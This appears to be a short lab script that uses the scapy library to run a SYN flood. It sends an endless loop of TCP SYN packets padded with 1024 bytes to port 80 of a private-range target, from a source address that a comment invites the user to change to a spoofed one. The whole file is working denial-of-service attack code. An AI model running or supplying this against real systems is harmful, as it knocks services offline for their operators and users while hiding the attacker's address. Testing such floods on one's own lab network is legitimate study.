

# TO TEST ON THE NODE


from scapy.all import *

# SOURCE_IP = "10.1.5.3" # Change this IP to spoof
TARGET_IP = "10.1.5.2"

def SYN_Flood(SOURCE_IP = "10.1.5.3"):
    print("Sending packets...")
    ip = IP(src=SOURCE_IP, dst=TARGET_IP)
    tcp = TCP(sport=RandShort(), dport=80, flags="S")
    raw = Raw(b"X"*1024)
    send(ip/tcp/raw, loop=1, verbose=0)